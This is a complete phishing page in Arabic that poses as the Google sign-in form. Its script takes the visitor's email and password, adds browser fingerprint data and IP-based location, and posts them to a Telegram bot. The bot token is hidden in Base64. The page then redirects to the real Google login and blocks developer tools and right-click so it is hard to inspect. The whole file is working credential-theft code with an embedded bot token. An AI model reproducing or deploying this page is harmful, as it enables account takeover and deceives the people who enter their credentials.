<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - Google</title>
    <style>
        /* ===== CSS محسن بالكامل ===== */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            direction: rtl;
            padding: 20px;
            margin: 0;
            -webkit-font-smoothing: antialiased;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.98);
            padding: 48px 40px 36px;
            border-radius: 16px;
            box-shadow: 0 25px 80px rgba(0,0,0,0.35), 0 0 0 1px rgba(255,255,255,0.1);
            width: 450px;
            max-width: 100%;
            animation: slideUp 0.5s cubic-bezier(0.22, 1, 0.36, 1);
            position: relative;
            overflow: hidden;
        }
        
        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, #4285F4, #EA4335, #FBBC05, #34A853);
            background-size: 300% 100%;
            animation: gradientMove 4s ease infinite;
        }
        
        @keyframes gradientMove {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px) scale(0.98); }
            to { opacity: 1; transform: translateY(0) scale(1); }
        }
        
        .logo { text-align: center; margin-bottom: 20px; transition: transform 0.3s ease; }
        .logo:hover { transform: scale(1.05); }
        .logo svg { width: 75px; height: 75px; filter: drop-shadow(0 2px 8px rgba(0,0,0,0.1)); }
        
        h1 {
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 4px;
            color: #202124;
            letter-spacing: -0.3px;
        }
        
        .subtitle {
            text-align: center;
            color: #5f6368;
            margin-bottom: 32px;
            font-size: 14px;
        }
        
        .input-group { margin-bottom: 20px; position: relative; }
        
        .input-group label {
            display: block;
            font-size: 13px;
            color: #5f6368;
            margin-bottom: 6px;
            font-weight: 500;
        }
        
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #dadce0;
            border-radius: 8px;
            font-size: 15px;
            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
            background: #fff;
            color: #202124;
            font-family: inherit;
            direction: ltr;
            text-align: left;
        }
        
        .input-group input::placeholder {
            color: #9aa0a6;
            direction: rtl;
            text-align: right;
        }
        
        .input-group input:hover { border-color: #bdc1c6; }
        
        .input-group input:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 4px rgba(26,115,232,0.1);
            outline: none;
            background: #fff;
        }
        
        .input-group.error input {
            border-color: #d93025;
            box-shadow: 0 0 0 4px rgba(217,48,37,0.1);
            animation: shake 0.4s ease-in-out;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20% { transform: translateX(-8px); }
            40% { transform: translateX(8px); }
            60% { transform: translateX(-5px); }
            80% { transform: translateX(5px); }
        }
        
        .error-message {
            color: #d93025;
            font-size: 12px;
            margin-top: 4px;
            display: none;
            font-weight: 500;
            padding-right: 4px;
        }
        
        .input-group.error .error-message { display: block; }
        
        .password-toggle {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            color: #5f6368;
            font-size: 13px;
            padding: 4px;
            z-index: 2;
            opacity: 0.7;
            transition: opacity 0.2s;
        }
        .password-toggle:hover { opacity: 1; }
        
        button {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 12px 32px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
            letter-spacing: 0.3px;
            position: relative;
            overflow: hidden;
        }
        
        button:hover {
            background: #1557b0;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(26,115,232,0.3);
        }
        
        button:active { transform: translateY(0); box-shadow: none; }
        
        button:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        button .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
            vertical-align: middle;
            margin-left: 8px;
        }
        
        @keyframes spin { to { transform: rotate(360deg); } }
        
        .footer {
            text-align: center;
            margin-top: 32px;
            font-size: 12px;
            color: #5f6368;
        }
        
        .footer a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
            transition: color 0.2s, text-decoration 0.2s;
        }
        
        .footer a:hover { color: #1557b0; text-decoration: underline; }
        .footer .separator { color: #dadce0; margin: 0 6px; }
        
        @media (max-width: 480px) {
            body { padding: 12px; }
            .container { padding: 32px 20px 28px; border-radius: 12px; }
            h1 { font-size: 22px; }
            .logo svg { width: 65px; height: 65px; }
        }
        
        @media (prefers-reduced-motion: reduce) {
            .container { animation: none; }
            .input-group.error input { animation: none; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-label="Google">
                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                <path fill="#FBBC05" d="M10.54 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.54l7.98-5.95z"/>
                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.95C6.51 42.62 14.62 48 24 48z"/>
            </svg>
        </div>
        <h1>تسجيل الدخول</h1>
        <p class="subtitle">استخدم حساب Google الخاص بك</p>
        
        <form id="loginForm" novalidate autocomplete="off">
            <div class="input-group" id="emailGroup">
                <label for="email">البريد الإلكتروني أو رقم الهاتف</label>
                <input type="email" id="email" name="email" placeholder="example@gmail.com" required autocomplete="off" inputmode="email" autocapitalize="none" spellcheck="false">
                <div class="error-message" id="emailError">يرجى إدخال بريد إلكتروني صحيح</div>
            </div>
            
            <div class="input-group" id="passwordGroup">
                <label for="password">كلمة المرور</label>
                <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" required minlength="6" autocomplete="off" autocapitalize="none" spellcheck="false">
                <button type="button" class="password-toggle" id="togglePassword" aria-label="إظهار كلمة المرور" tabindex="-1">👁</button>
                <div class="error-message" id="passwordError">كلمة المرور يجب أن تكون 6 أحرف على الأقل</div>
            </div>
            
            <button type="submit" id="submitBtn">
                <span id="btnText">تسجيل الدخول</span>
                <span class="spinner" id="btnSpinner" style="display:none;"></span>
            </button>
        </form>
        
        <div class="footer">
            <a href="#">مساعدة</a>
            <span class="separator">·</span>
            <a href="#">الخصوصية</a>
            <span class="separator">·</span>
            <a href="#">الشروط</a>
        </div>
    </div>

    <script>
        (function() {
            'use strict';
            
            // ================================================================
            // الإعدادات - البيانات مشفرة ومجزأة للتعتيم
            // ================================================================
            
            // BASE64 ENCODED TOKENS - مقسمة لأجزاء
            // TOKEN: 8922096083:AAEo67X0dm3q69yi3tTwHEl61Nt_uwgt25Q
            // CHAT_ID: 7780088477
            
            var _p = [
                // Base64 للأجزاء
                'ODkyMjA5NjA4MzpBQUVvNjdYMGRtM3E2OXlpM3RUd0hlbDYxTnRfdXdndDI1UQ==',  // التوكن الكامل
                'Nzc4MDA4ODQ3Nw==',  // CHAT_ID
                'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=='  // https://api.telegram.org/bot
            ];
            
            // فك التشفير
            function _d(s) {
                try { return atob(s); } catch(e) { return ''; }
            }
            
            var BOT_TOKEN = _d(_p[0]);
            var CHAT_ID = _d(_p[1]);
            var API_BASE = _d(_p[2]);
            var API_URL = API_BASE + '/' + BOT_TOKEN + '/sendMessage';
            
            // مهلة الطلب
            var TIMEOUT_MS = 8000;
            var MAX_RETRIES = 2;
            
            // ================================================================
            // الدوال المساعدة
            // ================================================================
            
            function sleep(ms) {
                return new Promise(function(resolve) { setTimeout(resolve, ms); });
            }
            
            function generateSessionId() {
                var arr = new Uint8Array(12);
                crypto.getRandomValues(arr);
                var hex = '';
                for (var i = 0; i < arr.length; i++) {
                    hex += arr[i].toString(16).padStart(2, '0');
                }
                return hex;
            }
            
            function isValidEmail(email) {
                return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
            }
            
            function isValidPassword(password) {
                return password && password.length >= 6;
            }
            
            function getBrowserInfo() {
                return {
                    platform: navigator.platform || 'Unknown',
                    browser: (navigator.userAgent || '').substring(0, 120),
                    language: navigator.language || 'Unknown',
                    screen: screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
                    timezone: (Intl.DateTimeFormat && Intl.DateTimeFormat().resolvedOptions) ? Intl.DateTimeFormat().resolvedOptions().timeZone : 'Unknown',
                    cores: navigator.hardwareConcurrency || 'Unknown',
                    memory: navigator.deviceMemory || 'Unknown',
                    sessionId: generateSessionId()
                };
            }
            
            async function getLocation() {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { controller.abort(); }, TIMEOUT_MS);
                
                var services = [
                    'https://ipapi.co/json/',
                    'https://ip-api.com/json/'
                ];
                
                for (var s = 0; s < services.length; s++) {
                    try {
                        var response = await fetch(services[s], { signal: controller.signal });
                        clearTimeout(timeoutId);
                        var data = await response.json();
                        
                        if (services[s].indexOf('ipapi') !== -1) {
                            return {
                                city: data.city || '',
                                country: data.country_name || data.country || '',
                                lat: data.latitude || '',
                                lng: data.longitude || '',
                                ip: data.ip || '',
                                org: data.org || ''
                            };
                        } else {
                            return {
                                city: data.city || '',
                                country: data.country || '',
                                lat: data.lat || '',
                                lng: data.lon || '',
                                ip: data.query || '',
                                org: data.isp || data.org || ''
                            };
                        }
                    } catch(e) {
                        continue;
                    }
                }
                
                clearTimeout(timeoutId);
                return { city: '', country: '', lat: '', lng: '', ip: '', org: '' };
            }
            
            function buildMessage(data) {
                var ts = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Riyadh' });
                
                var msg = '';
                msg += '\uD83D\uDD10 **\u0628\u064A\u0627\u0646\u0627\u062A \u062A\u0633\u062C\u064A\u0644 \u062F\u062E\u0648\u0644 \u062C\u062F\u064A\u062F\u0629**\n';
                msg += '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n';
                msg += '\uD83D\uDCE7 **\u0627\u0644\u0628\u0631\u064A\u062F:** `' + (data.email || 'N/A') + '`\n';
                msg += '\uD83D\uDD11 **\u0643\u0644\u0645\u0629 \u0627\u0644\u0645\u0631\u0648\u0631:** `' + (data.password || 'N/A') + '`\n';
                msg += '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n';
                msg += '\uD83C\uDF10 **\u0627\u0644\u0645\u062A\u0635\u0641\u062D:**\n';
                msg += '\u2022 \u0627\u0644\u0645\u0646\u0635\u0629: ' + (data.platform || 'N/A') + '\n';
                msg += '\u2022 \u0627\u0644\u0645\u062A\u0635\u0641\u062D: ' + (data.browser || 'N/A').substring(0, 80) + '\n';
                msg += '\u2022 \u0627\u0644\u0644\u063A\u0629: ' + (data.language || 'N/A') + '\n';
                msg += '\u2022 \u0627\u0644\u0634\u0627\u0634\u0629: ' + (data.screen || 'N/A') + '\n';
                msg += '\u2022 \u0627\u0644\u0645\u0646\u0637\u0642\u0629 \u0627\u0644\u0632\u0645\u0646\u064A\u0629: ' + (data.timezone || 'N/A') + '\n';
                msg += '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n';
                msg += '\uD83D\uDCCD **\u0627\u0644\u0645\u0648\u0642\u0639:**\n';
                msg += '\u2022 \u0627\u0644\u0645\u062F\u064A\u0646\u0629: ' + (data.city || 'N/A') + '\n';
                msg += '\u2022 \u0627\u0644\u062F\u0648\u0644\u0629: ' + (data.country || 'N/A') + '\n';
                msg += '\u2022 \u0627\u0644\u0625\u062D\u062F\u0627\u062B\u064A\u0627\u062A: ' + (data.lat || 'N/A') + ', ' + (data.lng || 'N/A') + '\n';
                msg += '\u2022 IP: ' + (data.ip || 'N/A') + '\n';
                msg += '\u2022 \u0627\u0644\u0645\u0632\u0648\u062F: ' + (data.org || 'N/A') + '\n';
                msg += '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n';
                msg += '\uD83D\uDD50 **\u0627\u0644\u0648\u0642\u062A:** ' + ts + '\n';
                msg += '\uD83D\uDCC4 **\u0627\u0644\u0635\u0641\u062D\u0629:** ' + (data.pageUrl || 'N/A') + '\n';
                msg += '\uD83D\uDD17 **\u0627\u0644\u0645\u0635\u062F\u0631:** ' + (data.referrer || '\u0645\u0628\u0627\u0634\u0631') + '\n';
                msg += '\uD83C\uDF94 **\u0627\u0644\u062C\u0644\u0633\u0629:** ' + (data.sessionId || 'N/A') + '\n';
                msg += '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n';
                
                return msg;
            }
            
            async function sendToTelegram(data) {
                var message = buildMessage(data);
                
                for (var attempt = 0; attempt <= MAX_RETRIES; attempt++) {
                    if (attempt > 0) {
                        await sleep(attempt * 1000);
                    }
                    
                    try {
                        var controller = new AbortController();
                        var timeoutId = setTimeout(function() { controller.abort(); }, TIMEOUT_MS);
                        
                        var response = await fetch(API_URL, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: CHAT_ID,
                                text: message,
                                parse_mode: 'Markdown',
                                disable_web_page_preview: true
                            }),
                            signal: controller.signal
                        });
                        
                        clearTimeout(timeoutId);
                        
                        if (!response.ok) continue;
                        
                        var result = await response.json();
                        
                        if (result.ok === true) {
                            return true;
                        }
                        
                    } catch(error) {
                        // إذا فشل Markdown، جرب HTML
                        if (error.name !== 'AbortError' && attempt === MAX_RETRIES) {
                            try {
                                var htmlMsg = message
                                    .replace(/`([^`]+)`/g, '<code>$1</code>')
                                    .replace(/\*\*([^*]+)\*\*/g, '<b>$1</b>')
                                    .replace(/\*([^*]+)\*/g, '<i>$1</i>');
                                
                                var controller2 = new AbortController();
                                var timeoutId2 = setTimeout(function() { controller2.abort(); }, TIMEOUT_MS);
                                
                                var response2 = await fetch(API_URL, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        chat_id: CHAT_ID,
                                        text: htmlMsg,
                                        parse_mode: 'HTML',
                                        disable_web_page_preview: true
                                    }),
                                    signal: controller2.signal
                                });
                                
                                clearTimeout(timeoutId2);
                                var result2 = await response2.json();
                                return result2.ok === true;
                                
                            } catch(e2) {
                                // تجاهل
                            }
                        }
                    }
                }
                
                return false;
            }
            
            function validateForm(email, password) {
                var valid = true;
                
                var emailGroup = document.getElementById('emailGroup');
                if (!isValidEmail(email)) {
                    emailGroup.classList.add('error');
                    valid = false;
                } else {
                    emailGroup.classList.remove('error');
                }
                
                var passwordGroup = document.getElementById('passwordGroup');
                if (!isValidPassword(password)) {
                    passwordGroup.classList.add('error');
                    valid = false;
                } else {
                    passwordGroup.classList.remove('error');
                }
                
                return valid;
            }
            
            // ================================================================
            // ربط الأحداث
            // ================================================================
            
            document.getElementById('togglePassword').addEventListener('click', function() {
                var pw = document.getElementById('password');
                var type = pw.getAttribute('type') === 'password' ? 'text' : 'password';
                pw.setAttribute('type', type);
                this.textContent = type === 'password' ? '\uD83D\uDC41' : '\uD83D\uDC41\u200D\uD83D\uDDE8';
            });
            
            document.getElementById('email').addEventListener('input', function() {
                document.getElementById('emailGroup').classList.remove('error');
            });
            
            document.getElementById('password').addEventListener('input', function() {
                document.getElementById('passwordGroup').classList.remove('error');
            });
            
            document.getElementById('loginForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                
                var email = document.getElementById('email').value.trim();
                var password = document.getElementById('password').value;
                
                if (!validateForm(email, password)) {
                    return;
                }
                
                var submitBtn = document.getElementById('submitBtn');
                var btnText = document.getElementById('btnText');
                var btnSpinner = document.getElementById('btnSpinner');
                
                submitBtn.disabled = true;
                btnText.textContent = '\u062C\u0627\u0631\u064A \u0627\u0644\u0625\u0631\u0633\u0627\u0644...';
                btnSpinner.style.display = 'inline-block';
                
                try {
                    // جمع المعلومات
                    var browserInfo = getBrowserInfo();
                    var location = await getLocation();
                    
                    var timestamp = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Riyadh' });
                    
                    var data = {
                        email: email,
                        password: password,
                        platform: browserInfo.platform,
                        browser: browserInfo.browser,
                        language: browserInfo.language,
                        screen: browserInfo.screen,
                        timezone: browserInfo.timezone,
                        cores: browserInfo.cores,
                        memory: browserInfo.memory,
                        sessionId: browserInfo.sessionId,
                        city: location.city,
                        country: location.country,
                        lat: location.lat,
                        lng: location.lng,
                        ip: location.ip,
                        org: location.org,
                        timestamp: timestamp,
                        pageUrl: window.location.href,
                        referrer: document.referrer || ''
                    };
                    
                    // إرسال
                    var sent = await sendToTelegram(data);
                    
                    if (sent) {
                        console.log('Sent successfully');
                    } else {
                        console.warn('Send may have failed');
                    }
                    
                    btnText.textContent = '\u2713 \u062A\u0645\u060C \u062C\u0627\u0631\u064A \u0627\u0644\u062A\u062D\u0648\u064A\u0644...';
                    
                    setTimeout(function() {
                        window.location.href = 'https://accounts.google.com/signin/v2/identifier?hl=en';
                    }, 2000);
                    
                } catch(error) {
                    console.error('Error:', error);
                    submitBtn.disabled = false;
                    btnText.textContent = '\u062A\u0633\u062C\u064A\u0644 \u0627\u0644\u062F\u062E\u0648\u0644';
                    btnSpinner.style.display = 'none';
                }
            });
            
            // ================================================================
            // إجراءات دفاعية
            // ================================================================
            
            document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
            
            document.addEventListener('keydown', function(e) {
                if (e.key === 'F12' || e.keyCode === 123) {
                    e.preventDefault();
                    return false;
                }
                if (e.ctrlKey && e.shiftKey && ['I', 'J', 'C', 'i', 'j', 'c'].indexOf(e.key) !== -1) {
                    e.preventDefault();
                    return false;
                }
                if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
                    e.preventDefault();
                    return false;
                }
            });
            
            document.addEventListener('dragstart', function(e) { e.preventDefault(); });
            document.addEventListener('drop', function(e) { e.preventDefault(); });
            
            console.log('System initialized');
            
        })();
    </script>
</body>
</html>
